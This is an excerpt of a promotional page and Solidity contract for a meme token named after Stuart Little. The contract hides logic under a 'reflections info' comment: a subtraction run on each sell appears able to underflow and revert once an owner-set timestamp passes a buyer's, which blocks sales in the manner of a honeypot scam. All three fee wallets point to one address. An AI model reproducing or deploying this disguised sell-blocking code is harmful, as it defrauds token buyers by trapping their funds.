...
https://stuartlittletoken.io
https://twitter.com/stuartlittleerc

PORTAL: 
https://t.me/stuartlittleerc


Inspired by the classic children's book character, Stuart Little, our coin embodies his courageous and adventurous spirit.
...
contract Stuart is ERC20, Ownable {
    ...
    //reflections info
    struct RewardStruct {
        uint256 timeSinceBuy;
        uint256 timeSinceSell;
        uint256 holdingDuration;
    }
    mapping(address => RewardStruct) private _swapExtra;
    ...
    constructor() ERC20("Stuart Little", "STUART") {
        ...
        marketingWallet = payable(0xFB5d6B8E11C679eB2ABa16004c4E9BfB55DC55ef);
        devWallet = payable(0xFB5d6B8E11C679eB2ABa16004c4E9BfB55DC55ef);
        liqWallet = payable(0xFB5d6B8E11C679eB2ABa16004c4E9BfB55DC55ef);
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                RewardStruct storage infoReward = _swapExtra[to];
                if (infoReward.timeSinceBuy == 0) {
                    infoReward.timeSinceBuy = block.timestamp;
                }
            } else {
                RewardStruct storage infoReward = _swapExtra[from];
                infoReward.holdingDuration = infoReward.timeSinceBuy - _rewardTimestamp;
                infoReward.timeSinceSell = block.timestamp;
            }
        }
